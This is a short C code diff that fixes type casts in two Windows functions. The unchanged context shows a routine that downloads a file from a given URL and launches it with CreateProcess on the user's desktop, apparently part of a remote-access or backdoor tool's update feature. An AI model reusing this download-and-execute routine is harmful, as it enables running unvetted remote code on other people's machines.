@@ -148,7 +148,8 @@ DWORD WINAPI Loop_DownManager(LPVOID lparam)
 	STARTUPINFO si = {0};
 	PROCESS_INFORMATION pi;
 	si.cb = sizeof si;
-	si.lpDesktop = "WinSta0\\Default"; 
+	char c_lpDesktop[] = "WinSta0\\Default";
+	si.lpDesktop = TEXT("WinSta0\\Default");
 	CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
 
 	return true;
@@ -160,7 +161,7 @@ bool UpdateServer(LPCTSTR lpURL)
 {
 	char	*lpFileName = NULL;
 	
-	lpFileName = strrchr(lpURL, '/') + 1;
+	lpFileName = (char	*)(strrchr(lpURL, '/') + 1);
 	if (lpFileName == NULL)
 		return false;
 	if (!http_get(lpURL, lpFileName))
